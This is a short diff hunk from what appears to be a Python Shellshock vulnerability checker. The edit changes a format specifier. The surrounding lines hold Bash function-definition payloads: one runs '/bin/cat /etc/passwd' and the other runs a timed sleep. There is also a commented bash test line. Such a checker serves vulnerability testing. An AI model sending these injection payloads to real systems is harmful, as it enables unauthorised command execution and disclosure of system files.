@@ -15,7 +15,7 @@ waitTime = 0.0
 
 EXPLOIT1 = '() { :;};a=`/bin/cat /etc/passwd`;echo $a'
 SLEEP_TIME = 7
-EXPLOIT2 = '() { :;}; /bin/sleep %s' % SLEEP_TIME
+EXPLOIT2 = '() { :;}; /bin/sleep %d' % SLEEP_TIME
 
 #env -i  X='() { (a)=>\' bash -c 'echo date'; cat echo
 #无漏洞的输出：
